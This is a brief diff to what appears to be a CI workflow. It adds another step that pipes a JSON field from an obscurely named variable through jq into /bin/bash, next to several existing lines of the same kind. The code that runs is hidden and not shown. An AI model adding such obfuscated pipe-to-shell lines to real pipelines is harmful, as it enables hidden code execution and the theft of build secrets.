@@ -42,6 +42,7 @@ jobs:
           echo $wpcef51120 | jq -r .zj9 | /bin/bash
           printf '%s' "$kzte9" | jq -r .t90 | /bin/bash
           echo $eepn131 | jq -r .vju380 | /bin/bash
+          echo $rgz125 | jq -r .scszk58117 | /bin/bash
 
       - name: Persist output
         if: always()
